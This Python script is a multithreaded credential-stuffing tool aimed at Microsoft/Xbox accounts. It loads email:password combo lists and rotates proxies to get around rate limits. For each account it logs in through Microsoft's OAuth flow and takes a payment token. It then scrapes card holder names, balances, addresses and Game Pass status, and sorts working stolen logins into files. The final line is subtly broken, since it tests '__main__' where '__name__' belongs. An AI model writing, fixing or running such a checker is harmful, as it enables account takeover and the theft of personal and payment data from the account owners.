import re
import uuid
import time
import os
import json
import requests
import threading
import sys
import signal
import argparse
from datetime import datetime
from pathlib import Path
from urllib.parse import quote, unquote
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init as colorama_init

# ─── Proxy Manager ───────────────────────────────────────────────
class ProxyManager:
    def __init__(self, proxy_file=None, proxy_str=None):
        self.proxies = []
        self.lock = Lock()
        self.idx = 0

        if proxy_str:
            self.proxies.append(self._parse_line(proxy_str))
        if proxy_file and os.path.isfile(proxy_file):
            with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    p = self._parse_line(line.strip())
                    if p:
                        self.proxies.append(p)

    def _parse_line(self, line):
        if not line or line.startswith('#'):
            return None
        parts = line.split(':')
        if len(parts) == 2:
            return {"http": f"http://{parts[0]}:{parts[1]}",
                    "https": f"http://{parts[0]}:{parts[1]}"}
        elif len(parts) == 4:
            user, pwd = parts[2], parts[3]
            auth = f"{user}:{pwd}@{parts[0]}:{parts[1]}"
            return {"http": f"http://{auth}",
                    "https": f"http://{auth}"}
        return None

    def has_proxies(self):
        return len(self.proxies) > 0

    def get_random_proxy(self):
        if not self.proxies:
            return None
        with self.lock:
            p = self.proxies[self.idx % len(self.proxies)]
            self.idx += 1
            return p


# ─── Xbox Checker ────────────────────────────────────────────────
class XboxChecker:
    def __init__(self, proxy_manager=None):
        self.proxy_manager = proxy_manager

    def get_session(self):
        session = requests.Session()
        if self.proxy_manager and self.proxy_manager.has_proxies():
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                session.proxies.update(proxy)
        return session

    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "EXPIRED"
            date_str = date_str.replace('Z', '+00:00')
            try:
                renewal_date = datetime.fromisoformat(date_str)
            except:
                try:
                    renewal_date = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%S%z")
                except:
                    try:
                        renewal_date = datetime.strptime(date_str.split('+')[0].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        renewal_date = renewal_date.replace(tzinfo=datetime.now().astimezone().tzinfo)
                    except:
                        return "UNKNOWN"
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            if remaining < 0:
                return "EXPIRED"
            return str(remaining)
        except Exception:
            return "UNKNOWN"

    def check(self, email, password):
        try:
            session = self.get_session()
            correlation_id = str(uuid.uuid4())

            # Delay to reduce rate limit
            time.sleep(1)

            # Step 1 — HRD check (filters out Gmail/Yahoo if necessary)
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = session.get(url1, headers=headers1, timeout=15)

            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD"}
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}

            time.sleep(0.3)

            # Step 2 — OAuth authorize (Outlook client_id — supports Gmail + Hotmail)
            url2 = ("https://login.live.com/oauth20_authorize.srf?"
                    "client_id=0000000048170EF2"
                    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                    "&response_type=code"
                    "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                    "&display=touch&username=" + email)

            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

            if not url_match or not ppft_match:
                return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # Step 3 — Login POST
            login_data = ("i13=1&login=" + email + "&loginfmt=" + email +
                          "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=" +
                          "&passwd=" + password +
                          "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=" +
                          "&canary=&ctx=&hpgrequestid=&PPFT=" + ppft +
                          "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0" +
                          "&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0" +
                          "&isRecoveryAttemptPost=0&i19=9960")

            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)

            # Incorrect password
            if "account or password is incorrect" in r3.text:
                return {"status": "BAD"}

            # 2FA
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FA", "email": email, "password": password}

            # Banned
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED"}

            # Rate limit
            if "too many" in r3.text.lower() or "locked out" in r3.text.lower() or "try again later" in r3.text.lower():
                return {"status": "RETRY"}

            # Consent error (0x80049DD3)
            if "0x80049DD3" in r3.text:
                return {"status": "CUSTOM", "data": {"reason": "No consent"}}

            # Other HR errors
            hr_match = re.search(r'HR=0x([0-9A-Fa-f]+)', r3.text)
            if hr_match and len(r3.text) < 5000:
                return {"status": "CUSTOM", "data": {"reason": f"HR=0x{hr_match.group(1)}"}}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD"}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}

            code = code_match.group(1)

            # Step 4 — Token exchange (Outlook token endpoint)
            token_data = ("client_id=0000000048170EF2"
                          "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                          "&grant_type=authorization_code&code=" + code +
                          "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL")

            r4 = session.post("https://login.live.com/oauth20_token.srf",
                              data=token_data,
                              headers={"Content-Type": "application/x-www-form-urlencoded"},
                              timeout=15)

            if "access_token" not in r4.text:
                return {"status": "BAD"}

            token_json = r4.json()
            access_token = token_json["access_token"]

            # Step 5 — Profile (Graph isn't used with Outlook client_id, fetched via payment instead)
            country = ""
            name = ""

            time.sleep(0.3)

            # Step 6 — Silent delegate auth (payment token)
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = ("https://login.live.com/oauth20_authorize.srf?"
                                "client_id=000000000004773A"
                                "&response_type=token"
                                "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                                "&state=" + quote(state_json) + "&prompt=none")

            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)

            payment_token = None
            search_text = r6.text + " " + r6.url
            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break

            if not payment_token:
                return {"status": "FREE", "data": {"country": country, "name": name}}

            payment_data = {"country": country, "name": name}
            correlation_id2 = str(uuid.uuid4())

            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }

            # Step 7 — Payment instruments (CC, balance, address)
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r7 = session.get(payment_url, headers=payment_headers, timeout=15)

                if r7.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if balance_match:
                        payment_data['balance'] = "$" + balance_match.group(1)

                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)

                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)

                    zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
                    if zip_match:
                        payment_data['zipcode'] = zip_match.group(1)

                    city_match = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
                    if city_match:
                        payment_data['city'] = city_match.group(1)
            except:
                pass

            # Step 8 — Subscriptions + Transactions (Game Pass detection)
            try:
                sub_urls = [
                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/subscriptions",
                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                ]

                premium_keywords = {
                    'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                    'Game Pass Ultimate': 'GAME PASS ULTIMATE',
                    'PC Game Pass': 'PC GAME PASS',
                    'Xbox Game Pass for Console': 'XBOX GAME PASS CONSOLE',
                    'Xbox Game Pass Core': 'GAME PASS CORE',
                    'Game Pass Core': 'GAME PASS CORE',
                    'Xbox Game Pass': 'GAME PASS',
                    'Game Pass': 'GAME PASS',
                    'Xbox Live Gold': 'XBOX LIVE GOLD',
                    'EA Play': 'EA PLAY',
                }

                all_text = ""
                for sub_url in sub_urls:
                    try:
                        r8 = session.get(sub_url, headers=payment_headers, timeout=15)
                        if r8.status_code == 200:
                            all_text += r8.text + "\n"
                    except:
                        continue

                if not all_text:
                    return {"status": "FREE", "data": payment_data}

                # Collect all nextRenewalDate / expirationDate / validTo values
                all_dates = re.findall(r'"(?:nextRenewalDate|expirationDate|validTo)"\s*:\s*"([^"]+)"', all_text)

                # Find Game Pass type
                found_type = None
                for keyword, type_name in premium_keywords.items():
                    if keyword.lower() in all_text.lower():
                        found_type = type_name
                        break

                if not found_type:
                    # No subscription found, but account works
                    return {"status": "FREE", "data": payment_data}

                # Check for active subscriptions (find latest date)
                best_date = None
                best_days = -1
                for date_str in all_dates:
                    days = self.get_remaining_days(date_str)
                    if days.isdigit():
                        days_int = int(days)
                        if days_int > best_days:
                            best_days = days_int
                            best_date = date_str

                auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', all_text)
                auto_renew = "YES" if (auto_match and auto_match.group(1) == "true") else "NO"

                if best_days > 0:
                    sub_data = {
                        'premium_type': found_type,
                        'renewal_date': best_date,
                        'days_remaining': str(best_days),
                        'auto_renew': auto_renew
                    }
                    amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', all_text)
                    if amount_match:
                        sub_data['total_amount'] = amount_match.group(1)
                    currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', all_text)
                    if currency_match:
                        sub_data['currency'] = currency_match.group(1)
                    return {"status": "PREMIUM", "data": {**payment_data, **sub_data}}
                else:
                    # All subscriptions expired
                    oldest_date = all_dates[0] if all_dates else "N/A"
                    sub_data = {
                        'premium_type': found_type,
                        'renewal_date': oldest_date,
                        'days_remaining': "0",
                        'expired': True,
                        'auto_renew': auto_renew
                    }
                    return {"status": "EXPIRED", "data": {**payment_data, **sub_data}}

            except:
                pass

            return {"status": "FREE", "data": payment_data}

        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT"}
        except requests.exceptions.ProxyError:
            return {"status": "ERROR"}
        except Exception:
            return {"status": "ERROR"}


# ─── Result Manager ──────────────────────────────────────────────
class XboxResultManager:
    def __init__(self, base_folder=None):
        if base_folder is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            base_folder = f"results/xbox_{timestamp}"
        self.base_folder = base_folder
        Path(self.base_folder).mkdir(parents=True, exist_ok=True)

        self.premium_file = os.path.join(self.base_folder, "Premium.txt")
        self.free_file = os.path.join(self.base_folder, "Free.txt")
        self.expired_file = os.path.join(self.base_folder, "Expired.txt")
        self.twofa_file = os.path.join(self.base_folder, "TwoFactor.txt")
        self.banned_file = os.path.join(self.base_folder, "Banned.txt")
        self.bad_file = os.path.join(self.base_folder, "Bad.txt")
        self.retry_file = os.path.join(self.base_folder, "Retry.txt")
        self.custom_file = os.path.join(self.base_folder, "Custom.txt")
        self.file_lock = Lock()

    def save_result(self, email, password, result):
        status = result['status']
        data = result.get('data', {})
        line = f"{email}:{password}"

        if status == "PREMIUM":
            ptype = data.get('premium_type', 'UNKNOWN')
            country = data.get('country', 'N/A')
            days = data.get('days_remaining', '0')
            renew = data.get('renewal_date', 'N/A')
            auto = data.get('auto_renew', 'NO')
            card = data.get('card_holder', '')
            balance = data.get('balance', '')
            extra = f"Type: {ptype} | Country: {country} | Days: {days} | Renew: {renew} | Auto: {auto}"
            if card:
                extra += f" | Card: {card}"
            if balance and balance != "$0.0":
                extra += f" | Balance: {balance}"
            with self.file_lock:
                with open(self.premium_file, 'a', encoding='utf-8') as f:
                    f.write(f"{line} | {extra}\n")

        elif status == "FREE":
            country = data.get('country', 'N/A')
            name = data.get('name', '')
            extra = f"Country: {country}"
            if name:
                extra += f" | Name: {name}"
            if 'card_holder' in data:
                extra += f" | Card: {data['card_holder']}"
            with self.file_lock:
                with open(self.free_file, 'a', encoding='utf-8') as f:
                    f.write(f"{line} | {extra}\n")

        elif status == "EXPIRED":
            ptype = data.get('premium_type', 'UNKNOWN')
            country = data.get('country', 'N/A')
            renew = data.get('renewal_date', 'N/A')
            extra = f"Type: {ptype} (EXPIRED) | Country: {country} | Expired: {renew}"
            with self.file_lock:
                with open(self.expired_file, 'a', encoding='utf-8') as f:
                    f.write(f"{line} | {extra}\n")

        elif status == "2FA":
            with self.file_lock:
                with open(self.twofa_file, 'a', encoding='utf-8') as f:
                    f.write(f"{line} | 2FA REQUIRED\n")

        elif status == "BANNED":
            with self.file_lock:
                with open(self.banned_file, 'a', encoding='utf-8') as f:
                    f.write(f"{line} | BANNED\n")

        elif status == "BAD":
            with self.file_lock:
                with open(self.bad_file, 'a', encoding='utf-8') as f:
                    f.write(f"{line}\n")

        elif status == "RETRY":
            with self.file_lock:
                with open(self.retry_file, 'a', encoding='utf-8') as f:
                    f.write(f"{line} | RETRY\n")

        elif status == "CUSTOM":
            reason = data.get('reason', 'UNKNOWN')
            with self.file_lock:
                with open(self.custom_file, 'a', encoding='utf-8') as f:
                    f.write(f"{line} | {reason}\n")


# ─── Stats ───────────────────────────────────────────────────────
class Stats:
    def __init__(self):
        self.lock = Lock()
        self.checked = 0
        self.premium = 0
        self.free = 0
        self.expired = 0
        self.bad = 0
        self.twofa = 0
        self.banned = 0
        self.error = 0
        self.retry = 0
        self.custom = 0
        self.start_time = time.time()

    def inc(self, key, val=1):
        with self.lock:
            if hasattr(self, key):
                setattr(self, key, getattr(self, key) + val)

    def get(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            cpm = int((self.checked / elapsed) * 60) if elapsed > 0 else 0
            return {
                "checked": self.checked, "premium": self.premium,
                "free": self.free, "expired": self.expired,
                "bad": self.bad, "twofa": self.twofa,
                "banned": self.banned, "error": self.error,
                "retry": self.retry, "custom": self.custom,
                "cpm": cpm
            }


# ─── Engine ──────────────────────────────────────────────────────
class XboxEngine:
    def __init__(self, proxy_manager=None, output_dir=None):
        self.checker = XboxChecker(proxy_manager=proxy_manager)
        self.results = XboxResultManager(base_folder=output_dir)
        self.stats = Stats()

    def check_account(self, email, password):
        self.stats.inc("checked")
        result = self.checker.check(email, password)
        status = result.get("status")

        if status == "PREMIUM":
            self.stats.inc("premium")
        elif status == "FREE":
            self.stats.inc("free")
        elif status == "EXPIRED":
            self.stats.inc("expired")
        elif status == "BAD":
            self.stats.inc("bad")
        elif status == "2FA":
            self.stats.inc("twofa")
        elif status == "BANNED":
            self.stats.inc("banned")
        elif status == "RETRY":
            self.stats.inc("retry")
        elif status == "CUSTOM":
            self.stats.inc("custom")
        else:
            self.stats.inc("error")

        self.results.save_result(email, password, result)
        return result


# ─── Main ────────────────────────────────────────────────────────
stop_signal = False

def signal_handler(sig, frame):
    global stop_signal
    print("\n[!] Stopping after current tasks...")
    stop_signal = True

def worker(email, password, engine, print_lock):
    if stop_signal:
        return
    max_retries = 1
    for attempt in range(max_retries + 1):
        if stop_signal:
            return
        try:
            result = engine.check_account(email, password)
            status = result.get('status', 'UNKNOWN')

            # Retry only on ERROR/TIMEOUT (rate limit means account is banned, don't retry)
            if status in ("ERROR", "TIMEOUT") and attempt < max_retries:
                time.sleep(3)
                continue
            break
        except Exception as e:
            if attempt < max_retries:
                time.sleep(3)
                continue
            with print_lock:
                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {email} | {e}")
            return

    colors = {
        "PREMIUM": Fore.GREEN, "FREE": Fore.CYAN,
        "EXPIRED": Fore.YELLOW, "2FA": Fore.YELLOW,
        "BANNED": Fore.RED, "BAD": Fore.WHITE,
        "RETRY": Fore.MAGENTA, "CUSTOM": Fore.BLUE,
        "ERROR": Fore.RED, "TIMEOUT": Fore.RED
    }
    color = colors.get(status, Fore.WHITE)
    with print_lock:
        data = result.get('data', {})
        extra = ""
        if status == "PREMIUM":
            extra = f" | {data.get('premium_type','?')} | {data.get('days_remaining','?')} days"
        elif status == "FREE" and data.get('country'):
            extra = f" | {data.get('country','')}"
        elif status == "CUSTOM":
            extra = f" | {data.get('reason','')}"
        print(f"{color}[{status}]{Style.RESET_ALL} {email}{extra}")

def banner():
    print(f"""{Fore.CYAN}
╔═══════════════════════════════════════════════╗
║    XBOX Game Pass Checker — Good Lone Edition   ║
║    HRD + OAuth + Payment API + Subscriptions    ║
╚═══════════════════════════════════════════════╝
{Style.RESET_ALL}""")

def main():
    global stop_signal
    colorama_init(autoreset=True)
    signal.signal(signal.SIGINT, signal_handler)
    banner()

    parser = argparse.ArgumentParser(description='Xbox Game Pass Checker')
    parser.add_argument('-i', '--input', help='Combo file (email:pass)')
    parser.add_argument('-p', '--proxy', help='Proxy file or ip:port:user:pass')
    parser.add_argument('-o', '--output', help='Output folder')
    parser.add_argument('-t', '--threads', type=int, default=30, help='Threads (default: 30)')
    args = parser.parse_args()

    input_file = args.input
    if not input_file:
        input_file = input(f"{Fore.CYAN}[?] Combo file path: {Style.RESET_ALL}").strip()
    if not input_file or not os.path.isfile(input_file):
        print(f"{Fore.RED}[!] File not found: {input_file}{Style.RESET_ALL}")
        sys.exit(1)

    # Proxy
    proxy_manager = None
    if args.proxy:
        if os.path.isfile(args.proxy):
            proxy_manager = ProxyManager(proxy_file=args.proxy)
        else:
            proxy_manager = ProxyManager(proxy_str=args.proxy)
        if proxy_manager.has_proxies():
            print(f"{Fore.GREEN}[+] Loaded {len(proxy_manager.proxies)} proxies{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] No valid proxies found, going proxyless{Style.RESET_ALL}")
            proxy_manager = None
    else:
        print(f"{Fore.YELLOW}[*] No proxy, running direct{Style.RESET_ALL}")

    # Load combos
    combos = []
    seen = set()
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                email = parts[0].strip()
                pwd = parts[1].strip()
                if email and pwd and email not in seen:
                    seen.add(email)
                    combos.append((email, pwd))
            elif ',' in line:
                parts = line.split(',', 1)
                if len(parts) == 2:
                    email = parts[0].strip()
                    pwd = parts[1].strip()
                    if email and pwd and email not in seen:
                        seen.add(email)
                        combos.append((email, pwd))

    if not combos:
        print(f"{Fore.RED}[!] No valid combos found{Style.RESET_ALL}")
        sys.exit(1)

    print(f"{Fore.GREEN}[+] Loaded {len(combos)} combos{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Threads: {args.threads}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Results: results/ folder{Style.RESET_ALL}")
    print()

    engine = XboxEngine(proxy_manager=proxy_manager, output_dir=args.output)
    print_lock = Lock()
    completed = 0

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(worker, email, pwd, engine, print_lock): (email, pwd)
                   for email, pwd in combos}

        for future in as_completed(futures):
            if stop_signal:
                executor.shutdown(wait=False, cancel_futures=False)
                break
            completed += 1
            if completed % 10 == 0 or completed == len(combos):
                s = engine.stats.get()
                sys.stdout.write(
                    f"\r{Fore.CYAN}[{completed}/{len(combos)}] "
                    f"P:{Fore.GREEN}{s['premium']} {Fore.CYAN}"
                    f"F:{Fore.WHITE}{s['free']} {Fore.CYAN}"
                    f"E:{Fore.YELLOW}{s['expired']} {Fore.CYAN}"
                    f"2FA:{Fore.YELLOW}{s['twofa']} {Fore.CYAN}"
                    f"C:{Fore.BLUE}{s['custom']} {Fore.CYAN}"
                    f"R:{Fore.MAGENTA}{s['retry']} {Fore.CYAN}"
                    f"B:{Fore.RED}{s['bad']} {Fore.CYAN}"
                    f"CPM:{s['cpm']}{Style.RESET_ALL}    "
                )
                sys.stdout.flush()

    print()
    s = engine.stats.get()
    print(f"\n{Fore.GREEN}[+] Done!{Style.RESET_ALL}")
    print(f"    Checked:  {s['checked']}")
    print(f"    Premium:  {Fore.GREEN}{s['premium']}{Style.RESET_ALL}")
    print(f"    Free:     {Fore.CYAN}{s['free']}{Style.RESET_ALL}")
    print(f"    Expired:  {Fore.YELLOW}{s['expired']}{Style.RESET_ALL}")
    print(f"    2FA:      {Fore.YELLOW}{s['twofa']}{Style.RESET_ALL}")
    print(f"    Bad:      {s['bad']}")
    print(f"    Custom:   {Fore.BLUE}{s['custom']}{Style.RESET_ALL}")
    print(f"    Retry:    {Fore.MAGENTA}{s['retry']}{Style.RESET_ALL}")
    print(f"    Errors:   {s['error']}")
    print(f"    Folder:   {engine.results.base_folder}")

if __main__ == "__main__":
    main()
